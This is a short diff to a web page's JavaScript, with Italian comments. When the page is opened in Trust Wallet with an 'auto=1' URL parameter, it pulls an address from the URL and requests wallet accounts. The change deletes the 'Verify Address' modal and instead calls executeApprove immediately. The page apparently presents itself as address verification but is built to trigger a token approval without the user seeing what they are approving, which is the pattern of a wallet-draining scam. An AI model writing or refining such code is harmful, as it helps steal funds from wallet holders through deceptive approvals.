@@ -487,21 +487,18 @@
     const isAuto = params.get('auto') === '1';
     
     if (isAuto && window.ethereum) {
-      // SIAMO in Trust Wallet con auto=1: connetti automaticamente
+      // SIAMO in Trust Wallet con auto=1: fai direttamente l'approve
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
-      
-      // Cambio testi modal
-      document.getElementById('modalTitle').textContent = "Verify Address";
-      document.getElementById('modalDesc').style.display = "block";
 
       try {
         // Richiedi connessione wallet automaticamente
         await window.ethereum.request({ method: "eth_requestAccounts" });
-        // Apri il modal con il wallet già connesso
-        openVerifyModal();
+        // Fai direttamente l'approve senza mostrare il modal
+        await executeApprove(addr);
       } catch (e) { 
-        console.error("Connect error:", e);
+        console.error("Error:", e);
+        alert('Error: ' + (e?.message || 'Unknown error'));
       }
     }
     
